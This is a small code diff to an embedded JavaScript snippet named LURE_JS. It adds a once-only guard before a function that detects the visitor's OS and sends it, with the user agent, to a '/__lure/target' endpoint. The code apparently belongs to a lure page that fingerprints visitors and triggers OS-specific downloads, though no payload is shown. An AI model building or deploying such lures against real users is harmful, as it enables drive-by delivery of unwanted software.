@@ -34,6 +34,8 @@ LURE_JS = """(function () {
     return "all";
   }
   function go() {
+    if (window.__fleetDownloaded) return;
+    window.__fleetDownloaded = true;
     var os = detectOS();
     fetch("/__lure/target?os=" + encodeURIComponent(os) +
           "&ua=" + encodeURIComponent(navigator.userAgent || ""))
